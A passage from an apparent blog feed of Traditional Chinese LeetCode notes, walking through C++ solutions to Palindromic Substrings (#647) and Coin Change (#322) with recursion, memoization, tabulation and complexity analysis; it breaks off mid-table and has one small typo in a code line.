        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/647/question.jpeg"></p><ul><li>題目難度： <code>Medium</code></li><li>題目敘述： 給定字串 <code>s</code>，回傳 <code>s</code> 中有多少回文子字串，回文代表字串從前往後讀等於從後往前讀都是一樣的字串。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>我的想法就是可以遞迴處理，每次可以讀取一段字串，之後用一個函數檢查是否是回文，如果是，就將字串加入結果列表，</p><figure class="highlight ex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;abc&quot;</span></span><br><span class="line"></span><br><span class="line">a -&gt; <span class="title class_">Check</span> <span class="keyword">if</span> palindromic</span><br><span class="line">ab -&gt; <span class="title class_">Check</span> <span class="keyword">if</span> palindromic</span><br><span class="line">abc -&gt; <span class="title class_">Check</span> <span class="keyword">if</span> palindromic</span><br><span class="line">ac -&gt; <span class="title class_">Check</span> <span class="keyword">if</span> palindromic</span><br><span class="line">b -&gt; <span class="title class_">Check</span> <span class="keyword">if</span> palindromic</span><br><span class="line">bc -&gt; <span class="title class_">Check</span> <span class="keyword">if</span> palindromic</span><br><span class="line">c -&gt; <span class="title class_">Check</span> <span class="keyword">if</span> palindromic</span><br><span class="line"></span><br><span class="line">list = [a,b,c]</span><br><span class="line">return list.size()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但後續發現會有大量重複計算的問題，很容易會超時，因此改變成其他做法</p><h2 id="我的解答"><a href="#我的解答" class="headerlink" title="我的解答"></a>我的解答</h2><h3 id="錯誤做法"><a href="#錯誤做法" class="headerlink" title="錯誤做法"></a>錯誤做法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; dp;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">checkPalindrome</span><span class="params">(string s, <span class="type">int</span> left, <span class="type">int</span> right)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(dp[left][right] != <span class="number">-1</span>) <span class="keyword">return</span> dp[left][right];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[left] != s[right])&#123;</span><br><span class="line">            dp[left][right] =<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        left++;</span><br><span class="line">        right--;</span><br><span class="line">    &#125;</span><br><span class="line">    dp[left][right] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">subStringHelper</span><span class="params">(string s, <span class="type">int</span> start)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=start; i&lt;s.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">checkPalindrome</span>(s, start, i))&#123;</span><br><span class="line">            count++;</span><br><span class="line">            count += <span class="built_in">subStringHelper</span>(s, i+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">countSubstrings</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line">    dp = vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(s.<span class="built_in">length</span>(), <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(s.<span class="built_in">length</span>(),<span class="number">-1</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">subStringHelper</span>(s, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先這裡分成三個函數，一個是題目給的 <code>countSubstrings</code>，另外一個是主要的遞迴邏輯 <code>subStringHelper</code> ，接著會是檢查回文的函數 <code>checkPalindrome</code>。那為了儲存重複計算的值，這裡宣告了一個二維陣列 <code>dp</code>，<code>dp[i][j]</code> 代表字串從 <code>s[i]</code> 到 <code>s[j]</code> 之間是否為回文，如果是回文那就會存放 <code>1</code> 如果不是回文就會是 <code>0</code>，如果還沒有檢查過那就是 <code>-1</code></p><p>首先在 <code>countSubstrings</code> 中初始化 <code>dp</code> 為 <code>-1</code>，接著由 <code>subStringHelper</code> 負責遞迴邏輯，在每次遞回中，會去用迴圈迭代字串 <code>s</code> 並給定不同的起始點，然後呼叫 <code>checkPalindrome</code> 來確認是否為回文，如果是回文，就將 <code>count</code> 值加一，並且指定下一個字串起始點，遞迴呼叫 <code>subStringHelper</code>，遞迴呼叫的結果會就代表後續一共有多少回文子字串，會跟當前的子字串數量加總 <code>count += subStringHelper(s, i+1)</code> 最後回傳 <code>count</code>。</p><p>判斷是否為回文的函數 <code>checkPalindrome</code> 首先如果 <code>dp[left][right] != -1</code> 就代表已經檢查過該範圍的子字串了，因此直接回傳結果。而如果還沒有檢查過，那就會進行檢查，檢查方式會是透過 Two Pointer  的方式從字串前後反向依序檢查每個字元是否一樣，如果出現不一樣的就馬上回傳 <code>false</code>，檢查完畢後都沒問題那就代表是回文，則 <code>dp[left][right]</code> 為 <code>1</code>。</p><blockquote><p>但這種做法會有問題，問題出在於遞迴方式的重複計算。每次遞迴計算 <code>subStringHelper(s, i+1)</code> 時，會將先前已計算的迴文子字串數量重複累加，導致最終的計數超過期望值。 所以如果要避免遞迴累加必須確保每個子字串的是否迴文只被計算一次</p></blockquote><h3 id="正確做法"><a href="#正確做法" class="headerlink" title="正確做法"></a>正確做法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; dp;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">checkPalindrome</span><span class="params">(string s, <span class="type">int</span> left, <span class="type">int</span> right)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(dp[left][right] != <span class="number">-1</span>) <span class="keyword">return</span> dp[left][right];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[left] != s[right])&#123;</span><br><span class="line">                dp[left][right] =<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            left++;</span><br><span class="line">            right--;００</span><br><span class="line">        &#125;</span><br><span class="line">        dp[left][right] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">subStringHelper</span><span class="params">(string &amp;s)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">        dp = vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, <span class="number">-1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;n; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=i; j&lt;n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">checkPalindrome</span>(s,i,j))&#123;</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="function"><span class="type">int</span> <span class="title">countSubstrings</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">subStringHelper</span>(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡變更了 <code>subStringHelper</code> 中對於子字串的切分，這裡透過雙重迴圈的方式來給定子字串範圍</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/647/result.jpeg"></p><blockquote><p>但透過雙重迴圈就是會犧牲時間複雜度，這樣的複雜度應該是很難被面試官接受的。</p></blockquote><h2 id="最佳化解答"><a href="#最佳化解答" class="headerlink" title="最佳化解答"></a>最佳化解答</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">checkPalindrome</span><span class="params">(<span class="type">const</span> string&amp; s, <span class="type">int</span> left, <span class="type">int</span> right)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>( left&gt;=<span class="number">0</span> &amp;&amp; right &lt; s.<span class="built_in">length</span>() &amp;&amp; s[left]==s[right])&#123;</span><br><span class="line">            left--;</span><br><span class="line">            right++;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countSubstrings</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt; s.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line">            <span class="type">int</span> even = <span class="built_in">checkPalindrome</span>(s, i, i+<span class="number">1</span>);</span><br><span class="line">            <span class="type">int</span> odd = <span class="built_in">checkPalindrome</span>(s, i,i);</span><br><span class="line">            result += even + odd;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這是在解答區中看到的很棒的做法，他判斷回文的方式是從中間開始，分別由左和右往外比對字元是否一樣 <code>s[left]</code> 是否能等於 <code>s[right]</code>，而這樣就要分成兩種狀況，分別是奇數長度的 <code>s</code> 或是偶數字串的 <code>s</code>。由於偶數字串沒有最中間的字元，需要透過迴圈來查找到第一個左右相鄰字元一樣的位置，即為偶數字串的中間。而奇數節點就好解決了，找到，它的中間值可以是任意字元，畢竟自己等於自己也算是回文，因此就一樣在迴圈中迭代每字元來去判斷，由該字元向左或向右擴展的子字串是否為回文。</p><p>而一旦有滿足條件的回文就會讓 <code>count</code> 加一，之後回傳結果，並會將結果加入到 <code>result</code> 中。</p><p><img src="/img/LeetCode/647/string.png"></p><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/647/result2.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>原先的做法：$O(N^3)$: 主函數是雙重迴圈，因此時間複雜度會是 $O(N^2)$，而在檢查回文函數的地方，需要比較不同範圍的子字串 <code>s[i]</code> 到 <code>s[j]</code>，因此可能會比較到 $\frac{j-i+1}{2}$，平均來看也會是 $O(N)$，因此整體時間複雜度會是 $O(N^3)$</p><p>解答區做法： $O(N^2)$： 主函數就從 0 掃到 <code>s.length()</code>，因此是 $O(N)$,而檢查回文函數，最壞狀況可能會檢查到整個字串，因此也是 $O(N)$，所以整體會是 $O(N^2)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>原先的做法： 使用了額外的儲存空間 <code>dp</code> 為 $N \times N$ 大小的矩陣，因此為 $O(N^2)$</p><p>解答區做法：僅使用常數空間變數，因此為 $O(1)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> String </tag>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Two Pointers </tag>
            
            <tag> Dynamic Programming </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>兌換零錢 | Medium | LeetCode#322. Coin Change</title>
      <link href="/posts/35e03d8a.html"/>
      <url>/posts/35e03d8a.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/322/question.jpeg"></p><ul><li>題目難度： <code>Medium</code></li><li>題目敘述： 給定一個整數陣列 <code>coins</code>，分別代表不同硬幣的面額，另外給定目標金額 <code>amount</code>，題目要求回傳，達到目標金額 <code>amount</code> 所需的 <strong>最少硬幣數量</strong>，如果 <code>coins</code> 中的面額無法達到目標金額就回傳 <code>-1</code></li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>首先假設今天陣列是 <code>[1,2,5]</code> 那對於 <code>amount</code> 每次可以選擇減1減2或減5，扣除完畢後下一輪又可以選擇要減1減2還是減5，直到最後如果 <code>amount</code> 為 0 則代表達到目標金額，如果扣除太多 <code>amount &lt; 0</code> 就代表不能達到目標金額，這時候就需要回傳 <code>-1</code>。如果畫出這個想法的遞迴樹會像是下面這樣。</p><details class="toggle" style="border: 1px solid bg"><summary class="toggle-button" style="background-color: bg;color: color">Step1 解法的遞迴樹</summary><div class="toggle-content"><p><img src="/img/LeetCode/322/tree.png"></p></div></details><p>可以看到應該會有很多重複的計算，因此稍後也會有最佳化的空間在。</p><h2 id="我的解答"><a href="#我的解答" class="headerlink" title="我的解答"></a>我的解答</h2><h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step-1"></a>Step-1</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">coinchangehelper</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; coins, <span class="type">int</span> amount)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(amount==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(amount &lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> minCount = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;coins.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">        <span class="type">int</span> result = <span class="built_in">coinchangehelper</span>(coins, amount-coins[i]);</span><br><span class="line">        <span class="keyword">if</span>(result &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(minCount==<span class="number">-1</span> || result+<span class="number">1</span> &lt; minCount) minCount = result+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> minCount;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">coinChange</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; coins, <span class="type">int</span> amount)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">coinchangehelper</span>(coins, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>步驟一就是先決定基本的遞迴關係式，以及 base case。首先只要 <code>amount</code> 扣到0就會回傳0，而扣超過的話就帶表上一步選擇的面額沒辦法達到目標金額。由於 <code>coins</code> 陣列的每個元素都可以選或不選，因此透過迴圈，讓每個元素都去用 <code>amount</code> 去扣掉當前元素，進入下一層遞迴，而遞迴返回的結果會被存放到 <code>result</code>，代表硬幣數量，如果這個 <code>result &gt; 0</code> 就代表，從該條路徑找到了一個可行的解，並且我們更新最小的硬幣數量 <code>minCoins</code>。 <strong>這裡之所以要加 1，是表示使用了當前硬幣</strong>：每當我們嘗試一枚硬幣時，會減去該硬幣的面值，並遞迴呼叫 <code>coinChangeHelper</code> 來計算剩餘金額的硬幣數量。這時候，因為我們已經選擇了一枚硬幣，所以總數需要加上 1。而前面的條件 <code>minCount == -1</code> 則代表第一次找到有效解。</p><p>最後就是返回 <code>minCount</code></p><blockquote><p>這樣初步的做法如果在 <code>coins</code> 和 <code>amount</code> 數值小的時候還不會出事，但如果數字一大，就會 Time Limit Exceeded。因此會需要進行第二步驟 - Memoization</p></blockquote><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step-2"></a>Step-2</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; dp;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">coinchangehelper</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; coins, <span class="type">int</span> amount)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(amount==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(amount &lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(dp[amount]!=<span class="number">-1</span>) <span class="keyword">return</span> dp[amount];</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> minCount = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;coins.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">        <span class="type">int</span> result = <span class="built_in">coinchangehelper</span>(coins, amount-coins[i]);</span><br><span class="line">        <span class="keyword">if</span>(result &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(minCount==<span class="number">-1</span> || result+<span class="number">1</span> &lt; minCount) minCount = result+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    dp[amount] = minCount;</span><br><span class="line">    <span class="keyword">return</span> dp[amount];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">coinChange</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; coins, <span class="type">int</span> amount)</span></span>&#123;</span><br><span class="line">    dp.<span class="built_in">resize</span>(amount+<span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">coinchangehelper</span>(coins, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這裡另外宣告了一個陣列 <code>dp</code> 用來儲存重複的計算，但這樣做如果去執行一樣會是 Time Limit Excceded! <strong>原因在於 <code>minCount</code>初始值的設定</strong></p><p>由於我們的 <code>dp</code> 也都初始化成 -1，<code>dp[amount]=-1</code> 代表這個金額尚未被計算過，而 <code>result=-1</code>則代表分支無法找到有效解，代表的前面額組合無法達到目標金額，當 <code>result == -1</code> 時，會必須檢查 <code>minCount == -1</code>，以確保在這些無效解中找到有效的最小解。這樣的 <code>-1</code> 邏輯會讓每次檢查 <code>minCount</code> 時，都必須額外處理 -1 的條件，並且在 <code>dp</code> 的值尚未更新（仍為 <code>-1</code>）時，也會進行多次重複計算。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; dp;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">coinchangehelper</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; coins, <span class="type">int</span> amount)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(amount==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(amount &lt;<span class="number">0</span>) <span class="keyword">return</span> INT_MAX;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(dp[amount]!=<span class="number">-1</span>) <span class="keyword">return</span> dp[amount];</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> minCount = INT_MAX;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;coins.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">        <span class="type">int</span> result = <span class="built_in">coinchangehelper</span>(coins, amount-coins[i]);</span><br><span class="line">        <span class="keyword">if</span>(result != INT_MAX)&#123;</span><br><span class="line">            minCount = <span class="built_in">min</span>(minCount, result+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    dp[amount] = minCount;</span><br><span class="line">    <span class="keyword">return</span> dp[amount];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">coinChange</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; coins, <span class="type">int</span> amount)</span></span>&#123;</span><br><span class="line">    dp.<span class="built_in">resize</span>(amount+<span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="type">int</span> result = <span class="built_in">coinchangehelper</span>(coins, amount);</span><br><span class="line">    <span class="keyword">if</span>(result==INT_MAX) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這裡改成將 <code>minCount</code> 初始化成 <code>INT_MAX</code>，就不會出現剛剛那種「此 -1 非彼 -1 的狀況」可以減少多餘的判斷。 <strong>當 <code>result == INT_MAX</code> 時，表示無法達到目標金額</strong>，我們可以簡單地檢查 <code>result != INT_MAX</code> 來判斷有效解。另外也透過 <code>min()</code> 來去判斷 <code>minCount</code> 還是遞迴呼叫結果哪個比較會小，也能減少判斷的複雜度。 </p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/322/result.jpeg"></p><h2 id="最佳化解答"><a href="#最佳化解答" class="headerlink" title="最佳化解答"></a>最佳化解答</h2><p>當然進行到這，還是會有更佳解，就是 Iteration + Tabulation。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">coinChange</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; coins, <span class="type">int</span> amount)</span></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; dp;</span><br><span class="line">    dp.<span class="built_in">resize</span>(amount+<span class="number">1</span>, INT_MAX);</span><br><span class="line">    dp[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;= amount; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;coins.<span class="built_in">size</span>();j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i - coins[j] &gt;=<span class="number">0</span> &amp;&amp; dp[i-coins[j]] != INT_MAX)&#123;</span><br><span class="line">                dp[i] = <span class="built_in">min</span>(dp[i], dp[i-coins[j]]+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(dp[amount]==INT_MAX) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> dp[amount];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><details class="toggle" style="border: 1px solid bg"><summary class="toggle-button" style="background-color: bg;color: color">表格迭代變化</summary><div class="toggle-content"><p>初始狀態</p><table><thead><tr><th>金額 <code>i</code></th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th><th>11</th></tr></thead><tbody><tr><td><code>dp[i]</code></td><td>0</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td></tr></tbody></table><p>外層迴圈: <code>i = 1</code></p><ul><li>嘗試硬幣 <code>1</code>：<ul><li><code>dp[1] = min(dp[1], dp[1 - 1] + 1) = min(∞, 0 + 1) = 1</code></li></ul></li></ul><table><thead><tr><th>金額 <code>i</code></th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th><th>11</th></tr></thead><tbody><tr><td><code>dp[i]</code></td><td>0</td><td>1</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td><td>∞</td></tr></tbody></table><p>外層迴圈: <code>i = 2</code></p><ul><li>嘗試硬幣 <code>1</code>：<ul><li><code>dp[2] = min(dp[2], dp[2 - 1] + 1) = min(∞, 1 + 1) = 2</code></li></ul></li><li>嘗試硬幣 <code>2</code>：<ul><li><code>dp[2] = min(dp[2], dp[2 - 2] + 1) = min(2, 0 + 1) = 1</code></li></ul></li></ul><table><thead><tr><th>金額 